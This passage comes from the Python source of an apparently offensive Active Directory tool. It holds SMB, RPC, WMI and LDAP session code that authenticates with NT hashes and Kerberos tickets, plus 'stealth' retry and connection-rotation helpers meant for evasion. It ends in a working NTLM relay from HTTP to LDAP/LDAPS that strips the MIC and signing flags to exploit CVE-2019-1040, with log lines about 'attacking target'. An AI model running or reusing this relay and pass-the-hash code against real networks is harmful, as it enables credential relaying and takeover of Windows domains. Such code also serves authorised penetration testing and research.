		# subkey), encrypted with the application session key
		# (Section 5.5.1)
		encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

		apReq['authenticator'] = noValue
		apReq['authenticator']['etype'] = cipher.enctype
		apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

		blob['MechToken'] = encoder.encode(apReq)

		request = ldap3.operation.bind.bind_operation(connection.version, connection.authentication, connection.user, None, 'GSS-SPNEGO',
													  blob.getData())

		# Done with the Kerberos saga, now let's get into LDAP
		if connection.closed:  # try to open connection if closed
			connection.open(read_server_info=False)

		connection.sasl_in_progress = True
		response = connection.post_send_single_response(connection.send('bindRequest', request, None))
		connection.sasl_in_progress = False
		if response[0]['result'] != 0:
			raise Exception(response)

		connection.bound = True

		return True

	def init_smb_session(self, host, username=None, password=None, nthash=None, lmhash=None, aesKey=None, domain=None, timeout=10, useCache=True, force_new=False, show_exceptions=True):
		"""
		Initialize or retrieve an SMB session using the connection pool
		
		Args:
			host: Target host name or IP
			username: Username for authentication
			password: Password for authentication
			nthash: NT hash for authentication
			lmhash: LM hash for authentication
			aesKey: AES key for Kerberos authentication
			domain: Domain for authentication
			timeout: Connection timeout
			useCache: Whether to use Kerberos cache
			force_new: Force creation of new connection (removes existing)
			
		Returns:
			SMBConnection object
			
		Raises:
			ConnectionError: If connection cannot be established
		"""
		if force_new:
			self._smb_pool.remove_connection(host)
		
		def smb_connection_factory():
			return self._create_smb_connection(host, username, password, nthash, lmhash, aesKey, domain, timeout, useCache)
		
		try:
			return self._smb_pool.get_connection(host, smb_connection_factory, show_exceptions=show_exceptions)
		except Exception as e:
			if show_exceptions:
				logging.error(f"Failed to get SMB connection for host {host}: {str(e)}")
				raise

	def _create_smb_connection(self, host, username=None, password=None, nthash=None, lmhash=None, aesKey=None, domain=None, timeout=10, useCache=True):
		"""
		Create a new SMB connection with enhanced error handling and port fallback
		
		Args:
			host: Target host name or IP
			username: Username for authentication
			password: Password for authentication
			nthash: NT hash for authentication
			lmhash: LM hash for authentication
			aesKey: AES key for Kerberos authentication
			domain: Domain for authentication
			timeout: Connection timeout
			useCache: Whether to use Kerberos cache
			
		Returns:
			SMBConnection object
			
		Raises:
			ConnectionError: If connection cannot be established on any port
		"""
		username = username or self.username
		password = password or self.password 
		nthash = nthash or self.nthash
		lmhash = lmhash or self.lmhash
		aesKey = aesKey or self.auth_aes_key
		domain = domain or self.domain
		
		if aesKey:
			useKerberos = True
			useCache = False
		else:
			useKerberos = self.use_kerberos

		ports = [445, 139] if not hasattr(self.args, 'smb_port') else [self.args.smb_port]
		
		for port in ports:
			try:
				logging.debug(f"[SMB] Attempting connection to {host}:{port}")
				conn = SMBConnection(host, host, sess_port=port, timeout=timeout)
				
				if useKerberos:
					self._handle_kerberos_smb_auth(conn, username, password, domain, lmhash, nthash, aesKey, useCache)
				else:
					conn.login(username, password, domain, lmhash, nthash)
				
				logging.debug(f"[SMB] Successfully connected to {host}:{port}")
				return conn
				
			except OSError as e:
				if port == 445 and 139 in ports:
					logging.debug(f"[SMB] Port 445 failed for {host}, trying 139: {str(e)}")
					continue
				else:
					logging.debug(f"[SMB] Connection failed to {host}:{port}: {str(e)}")
					raise
			except (SessionError, AssertionError) as e:
				logging.debug(f"[SMB] Authentication failed to {host}:{port}: {str(e)}")
				raise
		
		raise ConnectionError(f"Failed to establish SMB connection to {host} on any port")

	def _handle_kerberos_smb_auth(self, conn, username, password, domain, lmhash, nthash, aesKey, useCache):
		"""
		Handle Kerberos authentication for SMB connections
		
		Args:
			conn: SMBConnection object
			username: Username for authentication
			password: Password for authentication
			domain: Domain for authentication
			lmhash: LM hash for authentication
			nthash: NT hash for authentication
			aesKey: AES key for authentication
			useCache: Whether to use Kerberos cache
		"""
		if self.TGT and self.TGS:
			useCache = False

		if useCache:
			import os
			from impacket.krb5.ccache import CCache
			from impacket.krb5.kerberosv5 import KerberosError
			from impacket.krb5 import constants

			try:
				ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
			except Exception as e:
				logging.info(str(e))
				return
			else:
				if domain == '':
					domain = ccache.principal.realm['data'].decode('utf-8')
					logging.debug('Domain retrieved from CCache: %s' % domain)

				logging.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
				principal = 'cifs/%s@%s' % (self.targetIp.upper(), domain.upper())

				creds = ccache.getCredential(principal)
				if creds is None:
					principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
					creds = ccache.getCredential(principal)
					if creds is not None:
						self.TGT = creds.toTGT()
						logging.debug('Using TGT from cache')
					else:
						logging.debug('No valid credentials found in cache')
				else:
					self.TGS = creds.toTGS(principal)
					logging.debug('Using TGS from cache')

				if username == '' and creds is not None:
					username = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
					logging.debug('Username retrieved from CCache: %s' % username)
				elif username == '' and len(ccache.principal.components) > 0:
					username = ccache.principal.components[0]['data'].decode('utf-8')
					logging.debug('Username retrieved from CCache: %s' % username)
		
		conn.kerberosLogin(username, password, domain, lmhash, nthash, aesKey, self.dc_ip, self.TGT, self.TGS)

	def init_samr_session(self):
		if not self.samr:
			self.samr = self.connectSamr()
		return self.samr

	@staticmethod
	def get_dynamic_endpoint(interface, target, port=135, timeout=10):
		if not isinstance(interface, bytes) and isinstance(interface, str):
			interface = uuidtup_to_bin((interface, "0.0"))

		string_binding = rf"ncacn_ip_tcp:{target}[{port}]"
		logging.debug(f"[get_dynamic_endpoint] Connecting to {string_binding}")
		rpctransport = transport.DCERPCTransportFactory(string_binding)
		rpctransport.set_connect_timeout(timeout)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		return epm.hept_map(target, interface, protocol="ncacn_ip_tcp", dce=dce)

	# TODO: FIX kerberos auth
	def connectSamr(self):
		rpctransport = transport.SMBTransport(self.dc_ip, filename=r'\samr')

		if hasattr(rpctransport, 'set_credentials'):
			rpctransport.set_credentials(self.username, self.password, self.domain, lmhash=self.lmhash, nthash=self.nthash, aesKey=self.auth_aes_key, TGT=self.TGT, TGS=self.TGS)

		rpctransport.set_kerberos(self.use_kerberos, kdcHost=self.kdcHost)

		try:
			dce = rpctransport.get_dce_rpc()
			if self.use_kerberos:
				dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
			dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
			dce.connect()
			dce.bind(samr.MSRPC_UUID_SAMR)
			return dce
		except:
			return None

	# stole from PetitPotam.py
	# TODO: FIX kerberos auth
	def connectRPCTransport(self,
		host=None,
		username=None,
		password=None,
		domain=None,
		lmhash=None,
		nthash=None,
		stringBindings=None,
		interface_uuid=None,
		port=445,
		auth=True,
		set_authn=False,
		raise_exceptions=False
	):
		if self.stack_trace:
			raise_exceptions = True

		if not host:
			host = self.dc_ip

		if not domain:
			domain = self.domain

		if not username:
			username = self.username

		if username:
			if username and ('/' in username or '\\' in username):
				domain, username = username.replace('/', '\\').split('\\')
			elif '@' in username:
				username, domain = username.split('@')

		if not password:
			password = self.password

		if not nthash:
			nthash = self.nthash

		if not lmhash:
			lmhash = self.lmhash

		logging.debug("[RPCTransport] Using credentials: %s, %s, %s, %s, %s" % (username, password, domain, lmhash, nthash))

		if not stringBindings:
			stringBindings = epm.hept_map(host, samr.MSRPC_UUID_SAMR, protocol ='ncacn_ip_tcp')

		logging.debug("[RPCTransport] Connecting to %s" % stringBindings)
		rpctransport = transport.DCERPCTransportFactory(stringBindings)
		rpctransport.set_dport(port)

		if hasattr(rpctransport, 'set_credentials') and auth:
			rpctransport.set_credentials(username, password, domain, lmhash, nthash, TGT=self.TGT)

		if hasattr(rpctransport, 'set_kerberos') and self.use_kerberos and auth:
			rpctransport.set_kerberos(self.use_kerberos, kdcHost=self.kdcHost)

		if host:
			rpctransport.setRemoteHost(host)

		dce = rpctransport.get_dce_rpc()
		if self.use_kerberos:
			dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

		if set_authn:
			dce.set_auth_type(RPC_C_AUTHN_WINNT)
			dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)		

		try:
			dce.connect()
			if interface_uuid:
				dce.bind(interface_uuid)
			return dce
		except SessionError as e:
			logging.debug("[RPCTransport:SessionError] %s" % str(e))
			if raise_exceptions:
				raise e
			else:
				return
		except Exception as e:
			logging.debug("[RPCTransport:Exception] %s" % str(e))
			if raise_exceptions:
				raise e
			else:
				return

	# stolen from pywerview
	def create_rpc_connection(self, host, pipe):
		binding_strings = dict()
		binding_strings['srvsvc'] = srvs.MSRPC_UUID_SRVS
		binding_strings['wkssvc'] = wkst.MSRPC_UUID_WKST
		binding_strings['samr'] = samr.MSRPC_UUID_SAMR
		binding_strings['svcctl'] = scmr.MSRPC_UUID_SCMR
		binding_strings['drsuapi'] = drsuapi.MSRPC_UUID_DRSUAPI

		# TODO: try to fallback to TCP/139 if tcp/445 is closed
		if pipe == r'\drsuapi':
			string_binding = epm.hept_map(host, drsuapi.MSRPC_UUID_DRSUAPI,
										  protocol='ncacn_ip_tcp')
			rpctransport = transport.DCERPCTransportFactory(string_binding)
			rpctransport.set_credentials(username=self.username, password=self.password,
										 domain=self.domain, lmhash=self.lmhash,
										 nthash=self.nthash, TGT=self.TGT, TGS=self.TGS)
		else:
			rpctransport = transport.SMBTransport(host, 445, pipe,
												  username=self.username, password=self.password,
												  domain=self.domain, lmhash=self.lmhash,
												  nthash=self.nthash, doKerberos=self.use_kerberos, TGT=self.TGT, TGS=self.TGS)

		rpctransport.set_connect_timeout(10)
		dce = rpctransport.get_dce_rpc()

		if pipe == r'\drsuapi':
			dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

		try:
			dce.connect()
		except Exception as e:
			logging.critical('Error when creating RPC connection')
			logging.critical(e)
			self.rpc_conn = None
		else:
			dce.bind(binding_strings[pipe[1:]])
			self.rpc_conn = dce

		return self.rpc_conn

	def init_wmi_session(self, target, username=None, password=None, domain=None, lmhash=None, nthash=None, aesKey=None, do_kerberos=False, namespace='//./root/cimv2'):
		self.dcom = DCOMConnection(
				target,
				username if username is not None else self.username,
				password if password is not None else self.password,
				domain if domain is not None else self.domain,
				lmhash if lmhash is not None else self.lmhash,
				nthash if nthash is not None else self.nthash,
				aesKey if aesKey is not None else getattr(self, 'auth_aes_key', None),
				oxidResolver=True,
				doKerberos=do_kerberos if do_kerberos is not None else getattr(self, 'use_kerberos', False)
			)
		try:
			iInterface = self.dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
			iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
			self.wmi_conn = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
			iWbemLevel1Login.RemRelease()
			return self.dcom, self.wmi_conn
		except DCERPCSessionError as e:
			if hasattr(e, 'error_code') and e.error_code == 0x80041003:
				logging.debug(f"[init_wmi_session] Access denied (0x80041003): {e}")
				return self.dcom, self.wmi_conn
			raise
		except Exception as e:
			if 'WBEM_E_ACCESS_DENIED' in str(e) or '0x80041003' in str(e):
				logging.debug(f"[init_wmi_session] Access denied: {e}")
				return self.dcom, self.wmi_conn
			self.disconnect_wmi_session()
			raise

	def disconnect_wmi_session(self):
		try:
			if self.wmi_conn:
				try:
					self.wmi_conn.RemRelease()
				except Exception as e:
					logging.debug(f"[disconnect_wmi_session] RemRelease failed: {e}")
				finally:
					self.wmi_conn = None
			if self.dcom:
				try:
					self.dcom.disconnect()
				except Exception as e:
					logging.debug(f"[disconnect_wmi_session] dcom.disconnect failed: {e}")
				finally:
					self.dcom = None
		except Exception as e:
			logging.debug(f"[disconnect_wmi_session] Unexpected error: {e}")

	def init_rpc_session(self, host, pipe=r'\srvsvc'):
		if not self.rpc_conn:
			return self.create_rpc_connection(host=host, pipe=pipe)
		else:
			return self.rpc_conn

	def is_connection_alive(self):
		"""
		Check if the LDAP connection is alive and functional
		
		Returns:
			bool: True if connection is alive, False otherwise
		"""
		try:
			if not self.ldap_session or not hasattr(self.ldap_session, 'bound') or not self.ldap_session.bound:
				return False
			
			if hasattr(self.ldap_session, 'is_connection_alive'):
				return self.ldap_session.is_connection_alive()
			
			try:
				result = self.ldap_session.search(
					search_base=self.ldap_server.info.other['defaultNamingContext'][0],
					search_filter='(objectClass=*)',
					search_scope='BASE',
					attributes=['1.1']
				)
				return result
			except (KeyError, AttributeError, IndexError):
				try:
					result = self.ldap_session.search(
						search_base='',
						search_filter='(objectClass=*)',
						search_scope='BASE',
						attributes=['namingContexts']
					)
					return result
				except Exception:
					return False
		except (ldap3.core.exceptions.LDAPSocketOpenError, 
				ldap3.core.exceptions.LDAPSessionTerminatedByServerError,
				ldap3.core.exceptions.LDAPSocketSendError,
				ldap3.core.exceptions.LDAPSocketReceiveError):
			return False
		except Exception:
			return False

	def keep_alive(self):
		"""
		Perform a lightweight LDAP operation to keep the connection alive
		
		Returns:
			bool: True if connection is still alive, False otherwise
		"""
		try:
			if hasattr(self.ldap_session, 'abandon'):
				if self.args.stack_trace:
					logging.debug(f"[Connection] Sending Abandon(1) operation to keep the connection alive")
				abandon = ldap3.operation.abandon.abandon_operation(1)
				return self.ldap_session.send('abandonRequest', abandon, None)
			else:
				if self.args.stack_trace:
					logging.debug(f"[Connection] Using is_connection_alive() to keep connection alive")
				return self.is_connection_alive()
		except Exception as e:
			logging.debug(f"[Connection] Connection keep-alive check failed: {str(e)}")
			return False

	def __del__(self):
		"""Destructor to ensure all resources are properly cleaned up"""
		try:
			self.close()
		except:
			pass

	def get_smb_connection_with_stealth(self, host, delay_range=(1, 3), max_retries=3):
		"""
		Get SMB connection with stealth timing for evasion
		
		Args:
			host: Target host name or IP
			delay_range: Tuple of (min, max) delay in seconds between retries
			max_retries: Maximum number of retry attempts
			
		Returns:
			SMBConnection object
			
		Raises:
			ConnectionError: If connection cannot be established after retries
		"""
		for attempt in range(max_retries):
			try:
				if attempt > 0:
					delay = random.uniform(*delay_range)
					logging.debug(f"[SMB Stealth] Waiting {delay:.2f}s before retry {attempt+1}")
					time.sleep(delay)
				
				return self.init_smb_session(host)
			except Exception as e:
				if attempt == max_retries - 1:
					raise
				logging.debug(f"[SMB Stealth] Attempt {attempt+1} failed: {str(e)}")

	def rotate_smb_connection(self, host):
		"""
		Rotate SMB connection for operational security
		
		Args:
			host: Target host name or IP
			
		Returns:
			SMBConnection object (new connection)
		"""
		self._smb_pool.remove_connection(host)
		return self.init_smb_session(host, force_new=True)

	def check_smb_connection_health(self, host):
		"""
		Check if SMB connection to host is healthy
		
		Args:
			host: Target host name or IP
			
		Returns:
			bool: True if connection is healthy, False otherwise
		"""
		try:
			with self._smb_pool._pool_lock:
				if host.lower() in self._smb_pool._pool:
					entry = self._smb_pool._pool[host.lower()]
					return entry.is_alive()
			return False
		except Exception:
			return False

	def get_smb_session_stats(self):
		"""
		Get SMB connection pool statistics
		
		Returns:
			dict: Statistics about SMB connections
		"""
		return self._smb_pool.get_pool_stats()

	def cleanup_smb_connections(self):
		"""
		Cleanup all SMB connections
		"""
		self._smb_pool.shutdown()

	def get_all_smb_hosts(self):
		"""
		Get list of all hosts with active SMB connections
		
		Returns:
			list: List of host names/IPs with active connections
		"""
		return self._smb_pool.get_all_hosts()

	def remove_smb_connection(self, host):
		"""
		Remove SMB connection for specific host
		
		Args:
			host: Target host name or IP
		"""
		self._smb_pool.remove_connection(host)

class LDAPRelayServer(LDAPRelayClient):
	def initConnection(self):
		self.ldap_relay.scheme = "LDAP"
		self.server = ldap3.Server("ldap://%s:%s" % (self.targetHost, self.targetPort), get_info=ldap3.ALL)
		self.session = ldap3.Connection(self.server, user="a", password="b", authentication=ldap3.NTLM)
		self.session.open(False)
		return True

	def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
		if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
			respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
			token = respToken2['ResponseToken']
		else:
			token = authenticateMessageBlob

		authMessage = NTLMAuthChallengeResponse()
		authMessage.fromString(token)
		# When exploiting CVE-2019-1040, remove flags
		if self.serverConfig.remove_mic:
			if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
				authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
			if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
				authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
			if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
				authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
			if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
				authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
			authMessage['MIC'] = b''
			authMessage['MICLen'] = 0
			authMessage['Version'] = b''
			authMessage['VersionLen'] = 0
			token = authMessage.getData()

		with self.session.connection_lock:
			self.authenticateMessageBlob = token
			request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
			response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
			result = response[0]
		self.session.sasl_in_progress = False

		if result['result'] == RESULT_SUCCESS:
			self.session.bound = True
			self.session.refresh_server_info()
			self.ldap_relay.ldap_server = self.server
			self.ldap_relay.ldap_session = self.session

			return None, STATUS_SUCCESS
		else:
			if result['result'] == RESULT_STRONGER_AUTH_REQUIRED and self.PLUGIN_NAME != 'LDAPS':
				logging.error('Server rejected authentication because LDAP signing is enabled. Try connecting with TLS enabled (specify target as ldaps://hostname )')
		return None, STATUS_ACCESS_DENIED

	def cleanup(self):
		"""Properly cleanup LDAP connections"""
		try:
			if hasattr(self, 'session') and self.session:
				if self.session.bound:
					self.session.unbind()
				self.session = None
		except Exception as e:
			logging.error(f"Error during LDAP relay server cleanup: {str(e)}")

	def __del__(self):
		"""Destructor to ensure cleanup"""
		self.cleanup()

class LDAPSRelayServer(LDAPRelayServer):
	def __init__(self, serverConfig, target, targetPort = 636, extendedSecurity=True):
		LDAPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
	
	def initConnection(self):
		self.ldap_relay.scheme = "LDAPS"
		self.server = ldap3.Server("ldaps://%s:%s" % (self.targetHost, self.targetPort), get_info=ldap3.ALL)
		self.session = ldap3.Connection(self.server, user="a", password="b", authentication=ldap3.NTLM)
		try:
			self.session.open(False)
		except:
			pass
		return True

class HTTPRelayServer(HTTPRelayServer):
	class HTTPHandler(HTTPRelayServer.HTTPHandler):
		def do_relay(self, messageType, token, proxy, content = None):
			if messageType == 1:
				if self.server.config.disableMulti:
					self.target = self.server.config.target.getTarget(multiRelay=False)
					if self.target is None:
						logging.info("HTTPD(%s): Connection from %s controlled, but there are no more targets left!" % (
							self.server.server_address[1], self.client_address[0]))
						self.send_not_found()
						return
  
					logging.info("HTTPD(%s): Connection from %s controlled, attacking target %s://%s" % (
						self.server.server_address[1], self.client_address[0], self.target.scheme, self.target.netloc))
				try:
					ntlm_nego = self.do_ntlm_negotiate(token, proxy=proxy)
				except ldap3.core.exceptions.LDAPSocketOpenError as e:
					logging.debug(str(e))
					self.cleanup_connections()  # Add cleanup before exit
					return  # Return instead of exit to allow proper cleanup

				if not ntlm_nego:
					# Connection failed
					if self.server.config.disableMulti:
						logging.error('HTTPD(%s): Negotiating NTLM with %s://%s failed' % (self.server.server_address[1],
								  self.target.scheme, self.target.netloc))
						self.server.config.target.logTarget(self.target)
						self.send_not_found()
						return
					else:
						logging.error('HTTPD(%s): Negotiating NTLM with %s://%s failed. Skipping to next target' % (
							self.server.server_address[1], self.target.scheme, self.target.netloc))

						self.server.config.target.logTarget(self.target)
						self.target = self.server.config.target.getTarget(identity=self.authUser)

						if self.target is None:
							logging.info( "HTTPD(%s): Connection from %s@%s controlled, but there are no more targets left!" %
								(self.server.server_address[1], self.authUser, self.client_address[0]))
							self.send_not_found()
							return

						logging.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
							self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))

						self.do_REDIRECT()

			elif messageType == 3:
				authenticateMessage = NTLMAuthChallengeResponse()
				authenticateMessage.fromString(token)

				if self.server.config.disableMulti:
					if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_UNICODE:
						self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
													authenticateMessage['user_name'].decode('utf-16le'))).upper()
					else:
						self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
													authenticateMessage['user_name'].decode('ascii'))).upper()

					target = '%s://%s@%s' % (self.target.scheme, self.authUser.replace("/", '\\'), self.target.netloc)

				if not self.do_ntlm_auth(token, authenticateMessage):
					logging.error("Authenticating against %s://%s as %s FAILED" % (self.target.scheme, self.target.netloc,
																			   self.authUser))
					if self.server.config.disableMulti:
						self.send_not_found()
						return
					# Only skip to next if the login actually failed, not if it was just anonymous login or a system account
					# which we don't want
					if authenticateMessage['user_name'] != '':  # and authenticateMessage['user_name'][-1] != '$':
						self.server.config.target.logTarget(self.target)
						# No anonymous login, go to next host and avoid triggering a popup
						self.target = self.server.config.target.getTarget(identity=self.authUser)
						if self.target is None:
							logging.info("HTTPD(%s): Connection from %s@%s controlled, but there are no more targets left!" %
								(self.server.server_address[1], self.authUser, self.client_address[0]))
							self.send_not_found()
							return

						logging.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
							self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))

						self.do_REDIRECT()
					else:
						# If it was an anonymous login, send 401
						self.do_AUTHHEAD(b'NTLM', proxy=proxy)
				else:
					# Relay worked, do whatever we want here...
					logging.info("HTTPD(%s): Authenticating against %s://%s as %s SUCCEED" % (self.server.server_address[1],
						self.target.scheme, self.target.netloc, self.authUser))
					if self.server.config.disableMulti:
						# We won't use the redirect trick, closing connection...
						if self.command == "PROPFIND":
							self.send_multi_status(content)
						else:
							self.send_not_found()
						return
					else:
						# Let's grab our next target
						self.target = self.server.config.target.getTarget(identity=self.authUser)

						if self.target is None:
							LOG.info("HTTPD(%s): Connection from %s@%s controlled, but there are no more targets left!" % (
								self.server.server_address[1], self.authUser, self.client_address[0]))

							# Return Multi-Status status code to WebDAV servers
							if self.command == "PROPFIND":
								self.send_multi_status(content)
								return

							# Serve image and return 200 if --serve-image option has been set by user
							if (self.server.config.serve_image):
								self.serve_image()
								return

							# And answer 404 not found
							self.send_not_found()
							return

						# We have the next target, let's keep relaying...
						logging.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
							self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
						self.do_REDIRECT()

		def cleanup_connections(self):
			"""Clean up any open connections"""
			try:
				if hasattr(self, 'target') and self.target:
					if hasattr(self.target, 'session') and self.target.session:
						if getattr(self.target.session, 'bound', False):
							self.target.session.unbind()
						self.target.session = None
			except Exception as e:
				logging.error(f"Error during HTTP handler cleanup: {str(e)}")

	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self._active_connections = []
	
	def cleanup(self):
		"""Clean up server resources"""
		try:
			# Clean up active connections
			for conn in self._active_connections:
				if conn and hasattr(conn, 'cleanup'):
					conn.cleanup()
			self._active_connections = []
			
			# Close server socket
			if hasattr(self, 'socket') and self.socket:
				self.socket.close()
				self.socket = None
		except Exception as e:
			logging.error(f"Error during HTTP relay server cleanup: {str(e)}")
	
	def __del__(self):
		"""Destructor to ensure cleanup"""
		self.cleanup()

class Relay:
	def __init__(self, target, interface="0.0.0.0", port=80, args=None):
		self.target = target
		self.interface = interface
		self.port = port
		self.args = args
		self.ldap_session = None
		self.ldap_server = None
		self.scheme = None

		target = TargetsProcessor(
					singleTarget=self.target, protocolClients={
							"LDAP": self.get_relay_ldap_server,
							"LDAPS": self.get_relay_ldaps_server,
						}
				)

		config = NTLMRelayxConfig()
		config.setTargets(target)
		config.setInterfaceIp(interface)
		config.setListeningPort(port)
		config.setProtocolClients(
			{
				"LDAP": self.get_relay_ldap_server,
				"LDAPS": self.get_relay_ldaps_server,
			}
		)
		config.setMode("RELAY")
		config.setDisableMulti(True)
		self.server = HTTPRelayServer(config)

		self._servers = []  # Track active servers

	def get_scheme(self):
		return self.scheme

	def get_ldap_session(self):
		return self.ldap_session

	def get_ldap_server(self):
		return self.ldap_server

	def start(self):
		self.server.start()

		try:
			while True:
				if self.ldap_session is not None:
					logging.debug("Success! Relayed to the LDAP server. Closing HTTP Server")
					self.server.server.server_close()
					break
				time.sleep(0.1)
		except KeyboardInterrupt:
			print("")
			self.shutdown()
		except Exception as e:
			logging.error("Got error: %s" % e)
			sys.exit()

	def get_relay_ldap_server(self, *args, **kwargs) -> LDAPRelayClient:
		server = LDAPRelayServer(*args, **kwargs)
		server.ldap_relay = self
		if server:
			self._servers.append(server)
		return server

	def get_relay_ldaps_server(self, *args, **kwargs) -> LDAPRelayClient:
		server = LDAPSRelayServer(*args, **kwargs)
		server.ldap_relay = self
		if server:
			self._servers.append(server)
		return server

	def shutdown(self):
		"""Enhanced shutdown to ensure all resources are released"""
		try:
			# Close all tracked servers
			for server in self._servers:
				if hasattr(server, 'cleanup'):
					server.cleanup()
			self._servers = []
			
			# Call parent shutdown if it exists
			if hasattr(super(), 'shutdown'):
				super().shutdown()
		except Exception as e:
			logging.error(f"Error during relay shutdown: {str(e)}")
	
	def __del__(self):
		"""Destructor to ensure shutdown"""
		self.shutdown()
